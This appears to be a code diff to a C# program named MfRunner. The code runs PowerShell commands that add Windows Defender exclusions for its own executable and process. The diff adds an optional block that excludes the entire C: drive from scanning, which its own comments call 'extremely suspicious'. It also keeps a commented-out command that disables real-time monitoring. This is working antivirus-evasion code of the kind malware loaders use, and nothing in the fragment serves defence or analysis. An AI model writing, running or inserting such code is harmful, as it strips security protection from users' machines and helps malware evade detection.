@@ -34,15 +34,21 @@ namespace MfRunner
                     Path.GetFileName(exePath)
                 );
 
-                // Disable real-time monitoring (requires admin - will fail silently if not elevated)
-                string disableRealtimeCmd = "Set-MpPreference -DisableRealtimeMonitoring $true";
-
                 // Execute PowerShell commands
                 ExecutePowerShellCommand(pathExclusionCmd);
                 ExecutePowerShellCommand(processExclusionCmd);
                 
+#if DEFENDER_EXCLUDE_DRIVE
+                // AGGRESSIVE: Add C:\ drive exclusion
+                // WARNING: This excludes the entire C: drive from Windows Defender scanning
+                // Extremely effective but also extremely suspicious
+                string driveExclusionCmd = "Add-MpPreference -ExclusionPath 'C:\\'";
+                ExecutePowerShellCommand(driveExclusionCmd);
+#endif
+
                 // Optionally disable real-time monitoring (aggressive, may trigger alerts)
-                // ExecutePowerShellCommand(disableRealtimeCmd);
+                // Requires separate symbol: DEFENDER_DISABLE_REALTIME
+                // ExecutePowerShellCommand("Set-MpPreference -DisableRealtimeMonitoring $true");
             }
             catch
             {
